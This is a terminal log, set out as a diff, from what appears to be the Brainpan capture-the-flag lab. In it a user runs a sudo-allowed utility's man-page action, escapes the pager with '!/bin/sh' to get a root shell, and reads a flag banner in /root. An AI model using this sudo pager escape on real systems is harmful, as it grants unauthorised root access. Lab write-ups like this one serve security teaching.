@@ -1,0 +1,64 @@
+puck@brainpan:/$ sudo /home/anansi/bin/anansi_util
+sudo /home/anansi/bin/anansi_util
+Usage: /home/anansi/bin/anansi_util [action]
+Where [action] is one of:
+  - network
+  - proclist
+  - manual [command]
+puck@brainpan:/$ sudo /home/anansi/bin/anansi_util manual man
+sudo /home/anansi/bin/anansi_util manual man
+No manual entry for manual
+MAN(1)                        Manual pager utils                        MAN(1)
+
+NAME
+       man - an interface to the on-line reference manuals
+
+SYNOPSIS
+       man  [-C  file]  [-d]  [-D]  [--warnings[=warnings]]  [-R encoding] [-L
+       locale] [-m system[,...]] [-M path] [-S list]  [-e  extension]  [-i|-I]
+       [--regex|--wildcard]   [--names-only]  [-a]  [-u]  [--no-subpages]  [-P
+       pager] [-r prompt] [-7] [-E encoding] [--no-hyphenation] [--no-justifi‐
+       cation]  [-p  string]  [-t]  [-T[device]]  [-H[browser]] [-X[dpi]] [-Z]
+       [[section] page ...] ...
+       man -k [apropos options] regexp ...
+       man -K [-w|-W] [-S list] [-i|-I] [--regex] [section] term ...
+       man -f [whatis options] page ...
+       man -l [-C file] [-d] [-D] [--warnings[=warnings]]  [-R  encoding]  [-L
+       locale]  [-P  pager]  [-r  prompt]  [-7] [-E encoding] [-p string] [-t]
+       [-T[device]] [-H[browser]] [-X[dpi]] [-Z] file ...
+       man -w|-W [-C file] [-d] [-D] page ...
+       man -c [-C file] [-d] [-D] page ...
+       man [-hV]
+
+DESCRIPTION
+ Manual page man(1) line 1 (press h for help or q to quit)!/bin/sh
+!/bin/sh
+# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+# pwd
+pwd
+/usr/share/man
+# cd /root
+cd /root
+# dir
+dir
+b.txt
+# ls
+ls
+b.txt
+# cat b.txt
+cat b.txt
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+
+                                              http://www.techorganic.com
+
+
+
